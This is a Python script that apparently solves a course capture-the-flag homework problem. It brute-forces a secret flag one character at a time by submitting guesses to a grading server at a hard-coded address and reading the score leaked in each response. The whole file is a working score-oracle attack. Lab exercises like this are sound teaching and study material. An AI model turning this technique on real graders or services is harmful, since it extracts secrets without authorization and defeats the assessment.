import requests
import sys
import re

URL = 'http://140.112.91.4:45510/submit/3'
ALPHABET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_'
TARGET_LENGTH = 9

def get_score(s: str):
    payload = {'language': 'python', 'code': s}
    resp = requests.post(URL, data=payload)
    resp.raise_for_status()
    html = resp.text

    # use REGEX to find flash message: "submission Result for Problem 3: {result}, {score}"
    m = re.search(
        r'Submission Result for Problem \d+: ([^,<>]+),\s*(\d+)',
        html
    )
    if not m:
        raise RuntimeError('Cannot find result in response')
    result = m.group(1).strip()
    score = int(m.group(2))
    return result, score

def main():
    best = 'HW12{'
    best_score = 33
    best_result = None

    for pos in range(TARGET_LENGTH):
        for c in ALPHABET:
            candidate = best + c + '}'
            try:
                result, score = get_score(candidate)
            except Exception as e:
                print(f'Error: {e}', file=sys.stderr)
                sys.exit(1)

            if score > best_score:
                best_score = score
                best = best + c
                best_result = result
                print(f'pos={pos}, char `{c}`: {result}, score={score}')
                break


    flag = best + '}'
    print(f'Final Flag: {flag}, {best_result}, score={best_score}')

if __name__ == '__main__':
    main()
